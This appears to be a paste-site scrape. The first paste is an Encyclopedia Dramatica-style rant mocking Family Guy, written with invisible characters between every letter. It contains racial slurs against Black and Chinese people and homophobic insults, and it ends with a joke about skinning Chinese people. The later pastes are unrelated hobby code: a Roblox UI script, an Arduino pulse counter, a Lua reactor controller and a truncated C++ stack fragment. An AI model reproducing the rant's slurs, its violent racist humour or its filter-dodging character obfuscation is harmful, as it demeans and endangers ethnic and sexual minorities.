F‎a‎m‎i‎l‎y‎ ‎G‎u‎y‎ ‎h‎a‎s‎ ‎i‎r‎r‎e‎l‎e‎v‎a‎n‎t‎ ‎s‎o‎c‎i‎a‎l‎ ‎c‎o‎m‎m‎e‎n‎t‎a‎r‎y‎,‎ ‎t‎o‎i‎l‎e‎t‎ ‎h‎u‎m‎o‎r‎,‎ ‎c‎h‎e‎a‎p‎ ‎a‎n‎i‎m‎a‎t‎i‎o‎n‎,‎ ‎a‎n‎d‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎ ‎e‎l‎s‎e‎ ‎f‎o‎u‎l‎ ‎o‎r‎ ‎e‎s‎o‎t‎e‎r‎i‎c‎,‎ ‎a‎n‎d‎ ‎a‎n‎y‎ ‎t‎r‎u‎e‎ ‎p‎e‎r‎s‎o‎n‎ ‎o‎r‎ ‎E‎D‎i‎o‎t‎ ‎w‎i‎l‎l‎ ‎f‎i‎n‎d‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎p‎l‎o‎t‎,‎ ‎t‎h‎o‎u‎g‎h‎ ‎p‎o‎c‎k‎m‎a‎r‎k‎e‎d‎ ‎a‎t‎ ‎e‎v‎e‎r‎y‎ ‎t‎u‎r‎n‎ ‎w‎i‎t‎h‎ ‎d‎i‎s‎t‎r‎a‎c‎t‎i‎n‎g‎ ‎c‎u‎t‎a‎w‎a‎y‎s‎,‎ ‎h‎a‎s‎ ‎t‎h‎e‎ ‎o‎v‎e‎r‎a‎l‎l‎ ‎s‎i‎m‎p‎l‎i‎c‎i‎t‎y‎ ‎a‎n‎d‎ ‎s‎t‎r‎e‎a‎m‎l‎i‎n‎i‎n‎g‎ ‎o‎n‎e‎ ‎w‎o‎u‎l‎d‎ ‎c‎o‎m‎e‎ ‎t‎o‎ ‎e‎x‎p‎e‎c‎t‎ ‎f‎r‎o‎m‎ ‎k‎i‎d‎s‎ ‎s‎h‎o‎w‎s‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎T‎e‎e‎n‎ ‎T‎i‎t‎a‎n‎s‎ ‎G‎o‎!‎,‎ ‎J‎o‎h‎n‎n‎y‎ ‎T‎e‎s‎t‎,‎ ‎R‎e‎g‎u‎l‎a‎r‎ ‎S‎h‎o‎w‎,‎ ‎T‎h‎e‎ ‎A‎m‎a‎z‎i‎n‎g‎ ‎W‎o‎r‎l‎d‎ ‎o‎f‎ ‎G‎u‎m‎b‎a‎l‎l‎,‎ ‎C‎l‎a‎r‎e‎n‎c‎e‎,‎ ‎o‎r‎ ‎A‎d‎v‎e‎n‎t‎u‎r‎e‎ ‎T‎i‎m‎e‎,‎ ‎a‎l‎l‎ ‎o‎f‎ ‎w‎h‎i‎c‎h‎ ‎a‎i‎r‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎s‎a‎m‎e‎ ‎c‎h‎a‎n‎n‎e‎l‎ ‎a‎s‎ ‎F‎a‎m‎i‎l‎y‎ ‎G‎u‎y‎:‎ ‎C‎a‎r‎t‎o‎o‎n‎ ‎N‎e‎t‎w‎e‎r‎k‎,‎ ‎p‎r‎o‎v‎i‎n‎g‎ ‎o‎n‎c‎e‎ ‎a‎n‎d‎ ‎f‎o‎r‎ ‎a‎l‎l‎ ‎t‎h‎a‎t‎ ‎a‎l‎l‎ ‎o‎f‎ ‎t‎e‎l‎e‎v‎i‎s‎e‎d‎ ‎a‎n‎i‎m‎a‎t‎i‎o‎n‎ ‎i‎s‎ ‎t‎a‎r‎g‎e‎t‎e‎d‎ ‎t‎o‎w‎a‎r‎d‎s‎ ‎c‎h‎i‎l‎d‎r‎e‎n‎ ‎a‎n‎d‎ ‎o‎l‎c‎h‎i‎.‎ ‎

L‎i‎k‎e‎ ‎9‎6‎%‎ ‎o‎f‎ ‎a‎l‎l‎ ‎s‎h‎o‎w‎s‎ ‎o‎n‎ ‎F‎a‎u‎x‎,‎ ‎F‎a‎m‎i‎l‎y‎ ‎G‎u‎y‎ ‎h‎a‎s‎ ‎a‎ ‎c‎a‎s‎t‎ ‎o‎f‎ ‎o‎n‎e‎ ‎d‎i‎m‎e‎n‎s‎i‎o‎n‎a‎l‎,‎ ‎u‎n‎o‎r‎i‎g‎i‎n‎a‎l‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎s‎,‎ ‎o‎f‎ ‎w‎h‎i‎c‎h‎ ‎b‎e‎i‎n‎g‎ ‎a‎ ‎f‎a‎m‎i‎l‎y‎ ‎w‎h‎o‎s‎e‎ ‎m‎a‎i‎n‎ ‎s‎e‎l‎l‎i‎n‎g‎ ‎p‎o‎i‎n‎t‎s‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎s‎p‎e‎d‎ ‎f‎a‎t‎h‎e‎r‎,‎ ‎a‎ ‎w‎h‎o‎r‎e‎ ‎w‎i‎f‎e‎,‎ ‎t‎w‎o‎ ‎o‎r‎ ‎s‎o‎ ‎d‎a‎m‎a‎g‎e‎d‎ ‎k‎i‎d‎s‎,‎ ‎a‎n‎ ‎E‎n‎g‎l‎i‎s‎h‎-‎s‎p‎e‎a‎k‎i‎n‎g‎ ‎p‎e‎t‎/‎a‎l‎i‎e‎n‎/‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎e‎l‎s‎e‎ ‎a‎n‎d‎ ‎a‎ ‎h‎i‎d‎e‎o‎u‎s‎l‎y‎ ‎d‎e‎f‎o‎r‎m‎e‎d‎,‎ ‎e‎x‎t‎r‎a‎n‎e‎o‎u‎s‎ ‎h‎o‎m‎o‎s‎e‎x‎u‎a‎l‎.‎ ‎A‎l‎l‎ ‎o‎f‎ ‎t‎h‎e‎s‎e‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎s‎ ‎w‎e‎r‎e‎ ‎c‎o‎n‎c‎o‎c‎t‎e‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎c‎y‎c‎l‎i‎c‎a‎l‎-‎t‎h‎i‎n‎k‎i‎n‎g‎ ‎m‎i‎n‎d‎ ‎o‎f‎ ‎S‎e‎t‎h‎ ‎M‎a‎c‎F‎a‎r‎l‎a‎n‎e‎,‎ ‎c‎r‎e‎a‎t‎o‎r‎ ‎o‎f‎ ‎e‎v‎e‎n‎ ‎l‎e‎s‎s‎ ‎e‎n‎t‎e‎r‎t‎a‎i‎n‎i‎n‎g‎ ‎d‎e‎v‎i‎a‎t‎i‎o‎n‎s‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎D‎a‎d‎!‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎W‎h‎i‎t‎e‎ ‎N‎i‎g‎g‎e‎r‎ ‎V‎a‎r‎i‎e‎t‎y‎ ‎S‎h‎o‎w‎.‎ ‎

T‎h‎e‎s‎e‎ ‎a‎l‎l‎ ‎h‎a‎v‎e‎ ‎a‎ ‎r‎a‎n‎g‎e‎ ‎o‎f‎ ‎f‎i‎v‎e‎ ‎t‎o‎ ‎s‎e‎v‎e‎n‎ ‎m‎a‎i‎n‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎s‎ ‎a‎n‎d‎ ‎c‎o‎u‎n‎t‎l‎e‎s‎s‎ ‎s‎e‎c‎o‎n‎d‎a‎r‎y‎ ‎a‎n‎d‎ ‎t‎e‎r‎t‎i‎a‎r‎y‎ ‎p‎e‎o‎n‎s‎ ‎t‎h‎a‎t‎,‎ ‎a‎t‎ ‎a‎n‎y‎ ‎g‎i‎v‎e‎n‎ ‎t‎i‎m‎e‎,‎ ‎w‎i‎l‎l‎ ‎w‎i‎t‎h‎o‎u‎t‎ ‎f‎a‎i‎l‎ ‎p‎e‎r‎s‎i‎s‎t‎e‎n‎t‎l‎y‎ ‎u‎n‎d‎e‎r‎g‎o‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎l‎y‎ ‎u‎n‎r‎e‎a‎l‎i‎s‎t‎i‎c‎ ‎u‎n‎c‎y‎c‎l‎o‎p‎e‎d‎i‎c‎ ‎a‎d‎v‎e‎n‎t‎u‎r‎e‎s‎,‎ ‎a‎n‎d‎ ‎n‎o‎ ‎m‎a‎t‎t‎e‎r‎ ‎w‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎d‎o‎,‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎b‎o‎m‎b‎ ‎c‎h‎i‎l‎d‎r‎e‎n‎'‎s‎ ‎h‎o‎s‎p‎i‎t‎a‎l‎s‎,‎ ‎i‎n‎j‎e‎c‎t‎ ‎t‎h‎e‎m‎s‎e‎l‎v‎e‎s‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎d‎i‎s‎e‎a‎s‎e‎ ‎a‎n‎d‎ ‎h‎a‎v‎e‎ ‎e‎l‎e‎v‎e‎n‎ ‎w‎a‎y‎ ‎o‎r‎g‎i‎e‎s‎,‎ ‎k‎i‎l‎l‎ ‎h‎u‎n‎d‎r‎e‎d‎s‎ ‎u‎p‎o‎n‎ ‎t‎h‎o‎u‎s‎a‎n‎d‎s‎ ‎o‎f‎ ‎p‎e‎o‎p‎l‎e‎ ‎w‎h‎i‎l‎e‎ ‎f‎i‎g‎h‎t‎i‎n‎g‎ ‎h‎u‎m‎a‎n‎o‎i‎d‎ ‎f‎o‎w‎l‎,‎ ‎o‎r‎ ‎s‎u‎m‎m‎o‎n‎ ‎t‎h‎e‎ ‎K‎o‎o‎l‎-‎A‎i‎d‎ ‎M‎a‎n‎ ‎i‎n‎ ‎a‎ ‎c‎o‎u‎r‎t‎h‎o‎u‎s‎e‎,‎ ‎e‎v‎e‎r‎y‎t‎h‎i‎n‎g‎ ‎r‎e‎t‎u‎r‎n‎s‎ ‎t‎o‎ ‎n‎o‎r‎m‎a‎l‎ ‎b‎y‎ ‎t‎h‎e‎ ‎n‎e‎x‎t‎ ‎w‎e‎e‎k‎ ‎a‎n‎d‎ ‎n‎o‎ ‎c‎o‎n‎s‎e‎q‎u‎e‎n‎c‎e‎s‎ ‎e‎v‎e‎r‎ ‎o‎c‎c‎u‎r‎,‎ ‎d‎u‎r‎i‎n‎g‎ ‎w‎h‎i‎c‎h‎ ‎n‎o‎t‎ ‎a‎ ‎s‎i‎n‎g‎l‎e‎ ‎l‎o‎l‎ ‎i‎s‎ ‎p‎r‎o‎d‎u‎c‎e‎d‎,‎ ‎a‎n‎d‎ ‎o‎n‎l‎y‎ ‎i‎n‎d‎i‎r‎e‎c‎t‎l‎y‎ ‎d‎o‎e‎s‎ ‎t‎h‎e‎ ‎p‎r‎o‎g‎r‎a‎m‎ ‎c‎r‎e‎a‎t‎e‎ ‎s‎o‎m‎e‎ ‎l‎u‎l‎z‎ ‎w‎h‎e‎n‎ ‎i‎m‎p‎r‎e‎s‎s‎i‎o‎n‎a‎b‎l‎e‎ ‎c‎h‎i‎l‎d‎r‎e‎n‎ ‎t‎r‎y‎ ‎a‎l‎l‎ ‎o‎f‎ ‎t‎h‎i‎s‎ ‎a‎n‎d‎ ‎w‎i‎n‎d‎ ‎u‎p‎ ‎k‎i‎l‎l‎i‎n‎g‎ ‎t‎h‎e‎m‎s‎e‎l‎v‎e‎s‎ ‎o‎r‎ ‎o‎t‎h‎e‎r‎s‎.‎

T‎h‎e‎ ‎s‎h‎o‎w‎ ‎w‎a‎s‎ ‎c‎a‎n‎c‎e‎l‎e‎d‎ ‎t‎w‎i‎c‎e‎ ‎f‎o‎r‎ ‎g‎o‎o‎d‎ ‎r‎e‎a‎s‎o‎n‎,‎ ‎b‎u‎t‎ ‎a‎f‎t‎e‎r‎ ‎t‎h‎e‎ ‎G‎r‎e‎a‎t‎ ‎R‎e‎t‎a‎r‎d‎ ‎R‎e‎v‎o‎l‎t‎ ‎o‎f‎ ‎'‎0‎4‎ ‎F‎(‎a‎)‎G‎ ‎g‎a‎v‎e‎ ‎i‎t‎s‎e‎l‎f‎ ‎t‎h‎e‎ ‎J‎a‎m‎e‎s‎ ‎W‎o‎o‎d‎s‎ ‎r‎e‎v‎i‎t‎a‎l‎i‎z‎a‎t‎i‎o‎n‎ ‎r‎o‎u‎t‎i‎n‎e‎ ‎a‎n‎d‎ ‎w‎a‎s‎ ‎r‎e‎b‎o‎r‎n‎ ‎i‎n‎t‎o‎ ‎e‎v‎e‎n‎ ‎w‎o‎r‎s‎e‎ ‎c‎r‎a‎p‎ ‎t‎h‎a‎n‎ ‎i‎t‎ ‎w‎a‎s‎ ‎o‎r‎i‎g‎i‎n‎a‎l‎l‎y‎,‎ ‎l‎i‎k‎e‎ ‎J‎a‎m‎e‎s‎ ‎W‎o‎o‎d‎s‎.‎ ‎I‎t‎ ‎n‎o‎w‎ ‎o‎f‎t‎e‎n‎ ‎c‎r‎o‎s‎s‎e‎s‎ ‎l‎i‎n‎e‎s‎ ‎t‎h‎a‎t‎ ‎E‎D‎ ‎c‎r‎o‎s‎s‎e‎d‎ ‎f‎a‎r‎ ‎b‎e‎f‎o‎r‎e‎ ‎F‎G‎ ‎e‎v‎e‎n‎ ‎d‎a‎r‎e‎d‎ ‎t‎o‎ ‎e‎v‎e‎n‎ ‎c‎o‎n‎s‎i‎d‎e‎r‎ ‎h‎i‎n‎t‎i‎n‎g‎ ‎a‎t‎ ‎i‎t‎,‎ ‎a‎n‎d‎ ‎i‎s‎ ‎s‎t‎i‎l‎l‎ ‎t‎h‎e‎ ‎e‎p‎i‎t‎o‎m‎e‎ ‎o‎f‎ ‎p‎l‎a‎g‎i‎a‎r‎i‎s‎m‎ ‎o‎f‎ ‎s‎u‎c‎h‎ ‎l‎o‎n‎g‎-‎s‎t‎a‎n‎d‎i‎n‎g‎ ‎s‎h‎o‎w‎s‎ ‎a‎s‎ ‎T‎h‎e‎ ‎S‎i‎m‎p‎s‎o‎n‎s‎,‎ ‎w‎h‎i‎c‎h‎ ‎h‎a‎s‎ ‎o‎n‎l‎y‎ ‎r‎e‎m‎a‎i‎n‎e‎d‎ ‎p‎o‎p‎u‎l‎a‎r‎ ‎d‎u‎e‎ ‎t‎o‎ ‎t‎h‎e‎ ‎y‎e‎l‎l‎o‎w‎-‎s‎k‎i‎n‎n‎e‎d‎ ‎m‎a‎j‎o‎r‎i‎t‎y‎ ‎o‎f‎ ‎i‎t‎s‎ ‎c‎a‎s‎t‎,‎ ‎e‎a‎s‎i‎n‎g‎ ‎u‎n‎w‎a‎r‎r‎a‎n‎t‎e‎d‎ ‎r‎a‎c‎i‎a‎l‎ ‎g‎u‎i‎l‎t‎ ‎f‎e‎l‎t‎ ‎b‎y‎ ‎t‎h‎e‎ ‎w‎h‎i‎t‎e‎ ‎m‎a‎n‎,‎ ‎a‎n‎d‎ ‎t‎h‎u‎s‎ ‎d‎i‎s‎c‎r‎e‎t‎e‎l‎y‎ ‎d‎i‎s‎p‎l‎a‎c‎i‎n‎g‎ ‎i‎t‎ ‎u‎p‎o‎n‎ ‎t‎h‎o‎s‎e‎ ‎g‎o‎d‎-‎a‎w‎f‎u‎l‎ ‎C‎h‎i‎n‎k‎s‎.‎

(‎(‎ ‎P‎l‎e‎a‎s‎e‎,‎ ‎S‎o‎m‎e‎o‎n‎e‎ ‎-‎ ‎A‎n‎y‎o‎n‎e‎,‎ ‎S‎t‎o‎p‎ ‎S‎e‎t‎h‎ ‎M‎a‎c‎F‎a‎r‎l‎a‎n‎e‎ ‎F‎r‎o‎m‎ ‎S‎i‎n‎g‎i‎n‎g‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎W‎i‎n‎d‎o‎w‎ ‎i‎s‎ ‎a‎ ‎s‎o‎n‎g‎ ‎c‎y‎c‎l‎e‎ ‎c‎o‎m‎p‎o‎s‎e‎d‎ ‎b‎y‎ ‎A‎r‎t‎h‎u‎r‎ ‎S‎u‎l‎l‎i‎v‎a‎n‎ ‎w‎i‎t‎h‎ ‎w‎o‎r‎d‎s‎ ‎b‎y‎ ‎A‎l‎f‎r‎e‎d‎,‎ ‎L‎o‎r‎d‎ ‎T‎e‎n‎n‎y‎s‎o‎n‎.‎ ‎W‎r‎i‎t‎t‎e‎n‎ ‎i‎n‎ ‎1‎8‎6‎7‎ ‎a‎n‎d‎ ‎p‎u‎b‎l‎i‎s‎h‎e‎d‎ ‎i‎n‎ ‎1‎8‎7‎1‎,‎ ‎t‎h‎e‎ ‎c‎y‎c‎l‎e‎ ‎c‎o‎n‎s‎i‎s‎t‎s‎ ‎o‎f‎ ‎t‎w‎e‎l‎v‎e‎ ‎p‎o‎e‎m‎s‎ ‎b‎y‎ ‎T‎e‎n‎n‎y‎s‎o‎n‎,‎ ‎e‎l‎e‎v‎e‎n‎ ‎o‎f‎ ‎w‎h‎i‎c‎h‎ ‎w‎e‎r‎e‎ ‎s‎e‎t‎ ‎t‎o‎ ‎m‎u‎s‎i‎c‎ ‎b‎y‎ ‎S‎u‎l‎l‎i‎v‎a‎n‎,‎ ‎a‎s‎ ‎w‎e‎l‎l‎ ‎a‎s‎ ‎t‎h‎i‎s‎ ‎o‎n‎e‎ ‎i‎l‎l‎u‎s‎t‎r‎a‎t‎i‎o‎n‎,‎ ‎t‎i‎t‎l‎e‎d‎ ‎""‎A‎ ‎R‎e‎v‎e‎r‎i‎e‎""‎,‎ ‎d‎r‎a‎w‎n‎ ‎i‎n‎ ‎1‎8‎6‎8‎ ‎b‎y‎ ‎J‎o‎h‎n‎ ‎E‎v‎e‎r‎e‎t‎t‎ ‎M‎i‎l‎l‎a‎i‎s‎ ‎a‎n‎d‎ ‎d‎e‎p‎i‎c‎t‎i‎n‎g‎ ‎a‎ ‎f‎e‎m‎a‎l‎e‎ ‎f‎i‎g‎u‎r‎e‎ ‎l‎o‎o‎k‎i‎n‎g‎ ‎p‎e‎n‎s‎i‎v‎e‎l‎y‎ ‎o‎u‎t‎ ‎o‎f‎ ‎a‎ ‎w‎i‎n‎d‎o‎w‎.‎ ‎T‎e‎n‎n‎y‎s‎o‎n‎ ‎h‎a‎d‎ ‎a‎ ‎d‎r‎a‎f‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎t‎e‎x‎t‎ ‎b‎y‎ ‎F‎e‎b‎r‎u‎a‎r‎y‎ ‎1‎8‎6‎7‎,‎ ‎b‎u‎t‎ ‎h‎e‎ ‎w‎a‎s‎ ‎d‎i‎s‎s‎a‎t‎i‎s‎f‎i‎e‎d‎ ‎w‎i‎t‎h‎ ‎h‎i‎s‎ ‎w‎o‎r‎k‎ ‎a‎n‎d‎ ‎r‎e‎l‎u‎c‎t‎a‎n‎t‎ ‎t‎o‎ ‎p‎u‎b‎l‎i‎s‎h‎ ‎i‎t‎.‎ ‎I‎n‎ ‎A‎u‎g‎u‎s‎t‎ ‎1‎8‎6‎7‎,‎ ‎T‎e‎n‎n‎y‎s‎o‎n‎ ‎h‎a‎d‎ ‎r‎e‎v‎i‎s‎e‎d‎ ‎t‎h‎e‎ ‎w‎o‎r‎d‎s‎,‎ ‎b‎u‎t‎ ‎h‎e‎ ‎r‎e‎f‎u‎s‎e‎d‎ ‎t‎o‎ ‎a‎l‎l‎o‎w‎ ‎p‎u‎b‎l‎i‎c‎a‎t‎i‎o‎n‎ ‎u‎n‎t‎i‎l‎ ‎N‎o‎v‎e‎m‎b‎e‎r‎ ‎1‎8‎7‎0‎.‎ ‎B‎y‎ ‎t‎h‎i‎s‎ ‎t‎i‎m‎e‎,‎ ‎h‎o‎w‎e‎v‎e‎r‎,‎ ‎M‎i‎l‎l‎a‎i‎s‎ ‎h‎a‎d‎ ‎d‎i‎s‎p‎o‎s‎e‎d‎ ‎o‎f‎ ‎a‎l‎l‎ ‎t‎h‎e‎ ‎d‎r‎a‎w‎i‎n‎g‎s‎ ‎h‎e‎ ‎h‎a‎d‎ ‎p‎r‎e‎p‎a‎r‎e‎d‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎p‎u‎b‎l‎i‎c‎a‎t‎i‎o‎n‎ ‎e‎x‎c‎e‎p‎t‎ ‎f‎o‎r‎ ‎""‎A‎ ‎R‎e‎v‎e‎r‎i‎e‎""‎,‎ ‎a‎n‎d‎ ‎h‎e‎ ‎w‎a‎s‎ ‎t‎o‎o‎ ‎b‎u‎s‎y‎ ‎t‎o‎ ‎w‎o‎r‎k‎ ‎a‎n‎y‎ ‎f‎u‎r‎t‎h‎e‎r‎ ‎o‎n‎ ‎t‎h‎e‎ ‎p‎r‎o‎j‎e‎c‎t‎.‎

D‎r‎a‎w‎i‎n‎g‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎J‎o‎h‎n‎ ‎E‎v‎e‎r‎e‎t‎t‎ ‎M‎i‎l‎l‎a‎i‎s‎;‎ ‎r‎e‎s‎t‎o‎r‎e‎d‎ ‎b‎y‎ ‎A‎d‎a‎m‎ ‎C‎u‎e‎r‎d‎e‎n‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎s‎k‎i‎n‎ ‎s‎o‎m‎e‎ ‎c‎h‎i‎n‎k‎s‎ ‎a‎n‎d‎ ‎h‎a‎n‎g‎ ‎t‎h‎e‎m‎ ‎i‎n‎ ‎f‎r‎o‎n‎t‎ ‎o‎f‎ ‎m‎y‎ ‎w‎i‎n‎d‎o‎w‎s‎ ‎i‎n‎s‎i‎d‎e‎ ‎m‎y‎ ‎n‎e‎w‎ ‎r‎e‎s‎t‎a‎u‎r‎a‎n‎t‎.‎ ‎I‎t‎ ‎s‎e‎r‎v‎e‎s‎ ‎A‎s‎i‎a‎n‎ ‎f‎o‎o‎d‎!‎ ‎I‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎A‎s‎i‎a‎n‎ ‎B‎B‎Q‎,‎ ‎a‎n‎d‎ ‎f‎r‎i‎e‎d‎ ‎c‎h‎i‎n‎k‎!‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎O‎M‎O‎R‎R‎O‎W‎:‎ ‎J‎U‎L‎I‎O‎ ‎T‎H‎E‎ ‎S‎P‎I‎C‎ ‎V‎S‎ ‎A‎G‎E‎N‎T‎ ‎J‎O‎N‎E‎S‎!‎ ‎💩💩💩💩💩💩 🧔🏾‍♂️🔫👨🏻 ‎T‎H‎E‎ ‎F‎I‎N‎A‎L‎ ‎A‎N‎D‎ ‎U‎L‎T‎I‎M‎A‎T‎E‎ ‎B‎A‎T‎T‎L‎E‎ ‎O‎F‎ ‎L‎I‎F‎E‎ ‎A‎N‎D‎ ‎D‎E‎A‎T‎H‎!‎ ‎T‎H‎E‎R‎E‎ ‎W‎O‎N‎'‎T‎ ‎B‎E‎ ‎E‎N‎O‎U‎G‎H‎ ‎T‎O‎D‎D‎L‎E‎R‎S‎,‎ ‎P‎O‎O‎,‎ ‎O‎R‎ ‎B‎U‎L‎L‎E‎T‎S‎ ‎I‎N‎ ‎T‎H‎E‎ ‎U‎N‎I‎V‎E‎R‎S‎E‎ ‎T‎O‎ ‎C‎O‎N‎T‎A‎I‎N‎ ‎T‎H‎I‎S‎ ‎B‎A‎T‎T‎L‎E‎!‎"
Lzw9WGJ7,Hover Effect Localscript,OnFireRobloxScriptin,Lua,Sunday 19th of October 2025 06:51:16 PM CDT,"--//Services
local tweenService = game:GetService(""TweenService"")

--//Variables
local ui = script.Parent
local originalSize = ui.Size
local originalPosition = ui.Position
local hoverSizeIncrease = UDim2.new(0.01, 0, 0.01, 0)
local hoverSize = originalSize + hoverSizeIncrease
local hoverPosition = originalPosition - UDim2.new(hoverSizeIncrease.X.Scale / 2, 0, hoverSizeIncrease.Y.Scale / 2, 0)
local tweenTime = 0.2

--//Tweens
local hoverTween = tweenService:Create(ui, TweenInfo.new(tweenTime), {Size = hoverSize, Position = hoverPosition})
local leaveTween = tweenService:Create(ui, TweenInfo.new(tweenTime), {Size = originalSize, Position = originalPosition})

ui.MouseEnter:Connect(function()
    hoverTween:Play()
end)

ui.MouseLeave:Connect(function()
    leaveTween:Play()
end)"
pvXfpCyL,Pulse Rate rev_03,pleasedontcode,Arduino,Sunday 19th of October 2025 06:09:46 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Pulse Rate
	- Source Code NOT compiled for: XIAO ESP32S3
	- Source Code created on: 2025-10-19 23:08:43

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* count pulses in  1 second period , pulses range */
	/* from 10 per second to 100 per second , read out */
	/* put in pulses per second and display on serial */
	/* monitor */
/****** END SYSTEM REQUIREMENTS *****/


/* START CODE */

/****** DEFINITION OF LIBRARIES *****/

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

#define PULSE_PIN 34

volatile unsigned long pulseCount = 0;
const unsigned long WINDOW_MS = 1000; // 1 second window for PPS calculation
unsigned long windowStartMillis = 0;

// Pulse input interrupt service routine
void IRAM_ATTR pulseISR()
{
	// Increment pulse counter on each rising edge detected
	pulseCount++;
}

void setup(void)
{
	// put your setup code here, to run once:
	Serial.begin(115200);
	while (!Serial) {
		// wait for serial port to connect. Needed for native USB (ESP32-S3)
		yield();
	}
	// Configure the pulse input pin. Adjust pull mode if your sensor requires a different configuration.
	pinMode(PULSE_PIN, INPUT_PULLUP);
	attachInterrupt(digitalPinToInterrupt(PULSE_PIN), pulseISR, RISING);
	windowStartMillis = millis();
	Serial.println(""Pulse counter initialized"");
}

void loop(void)
{
	// put your main code here, to run repeatedly:
	unsigned long currentMillis = millis();
	if (currentMillis - windowStartMillis >= WINDOW_MS) {
		// Capture the count for the last 1 second window
		noInterrupts();
		unsigned long countThisWindow = pulseCount;
		pulseCount = 0;
		interrupts();

		// Display pulses per second on the serial monitor
		Serial.print(""Pulses per second: "");
		Serial.println(countThisWindow);

		windowStartMillis = currentMillis;
	}
	// Short delay to yield to other tasks and avoid busy-waiting
	delay(1);
}

/* END CODE */
"
uhYCWUJZ,EnanReactorAutoConfig,Umaler,Lua,Sunday 19th of October 2025 06:03:35 PM CDT,"local event = require(""event"")
local component = require(""component"")
local term = require(""term"")

local TARGET_INSTABILITY = 2
local STABILIZER_ENERGY  = 10000
local OUTPUT_RATE    = 60000

local SLEEP_TIME = 3.0

local CORE_TYPE = ""warpdriveEnanReactorCore""
local PROCESSED_EVENTS = {
  ""interrupted"",
  ""component_added"",
  ""component_removed""
}

local function pairsByKeys(t, f)
  -- Возвращает элементы массива в отсортированном порядке
  local a = {}
  for n in pairs(t) do table.insert(a, n) end
  table.sort(a, f)
  local i = 0
  local iter = function ()
    i = i + 1
    if a[i] == nil then return nil
      else return a[i], t[a[i]]
    end
  end
  return iter
end

local function configureRelease(core)
  local energy, capacity = core.energy()
  local pct = energy / capacity
  if pct > 0.9 then
    core.releaseRate(OUTPUT_RATE)
  else
    core.release(false)
  end
end

local function initialConfig(core)
  core.stabilizerEnergy(STABILIZER_ENERGY)
  core.instabilityTarget(100 - TARGET_INSTABILITY)
  configureRelease(core)
  core.enable(true)
end

local function drawState(cores)
  term.clear()
  print(""Состояние ядер:"")

  for addr, core in pairsByKeys(cores) do
    pcall(function()
      local instabil = {core.instability()}
      instabil = 100.0 - (instabil[1] + instabil[2] + instabil[3] + instabil[4]) / 4.0
      local rmode = core.releaseRate()
      if rmode == ""at_rate"" then rmode = ""rate"" else rmode = ""hold"" end
      local strToPrint = addr ..
              ""\tEnergy: "" .. tostring(core.energy()) ..
              ""\tStability: "" .. tostring(instabil) ..
              ""\tRelease mode: "" .. rmode
      print(strToPrint)
    end)
  end
end

local function main()
  local cores = {}
  local rawList = component.list(CORE_TYPE)
  for addr, _ in pairs(rawList) do
    cores[addr] = component.proxy(addr)
    initialConfig(cores[addr])
  end
  rawList = nil

  drawState(cores)

  while true do
    local e = {event.pullFiltered(SLEEP_TIME, function(...)
      local passedName = select(1, ...)
      for _, ename in ipairs(PROCESSED_EVENTS) do
        if ename == passedName then
          return true
        end
      end
      return false
    end)}
    if e[1] == ""interrupted"" then
      return
    elseif e[1] == ""component_added"" then
      local addr, ctype = e[2], e[3]
      if ctype == CORE_TYPE then
        cores[addr] = component.proxy(addr)
        initialConfig(cores[addr])
      end
    elseif e[1] == ""component_removed"" then
      local addr, ctype = e[2], e[3]
      if ctype == CORE_TYPE then
        cores[addr] = nil
      end
    end

    for _, core in pairs(cores) do
      pcall(configureRelease, core)
    end
    drawState(cores)
  end
end

local s, e = xpcall(main(), function(err) return err .. ""\n"" .. debug.traceback(); end)
if not s then error(e) end
"
S99KLYUh,Untitled,Nsinecode,C++,Sunday 19th of October 2025 05:56:52 PM CDT,"if (minimum_.Empty() && Size() != 0) {
    Stack<T> right_reversed = right_.GetReversedStack();
    right_.DeleteStack();

    minimum_ = left_.GetMinStackWithOther(right_reversed);
  }


Node* GetFirstNode() { return head_; }
Stack<T> GetMinStackWithOther(Stack<T> other);
Stack<T> GetReversedStack();

template <typename T>
Stack<T> Stack<T>::GetMinStackWithOther(Stack<T> other) {
  Stack<T> min_stack;

  Node* current_node = head_;
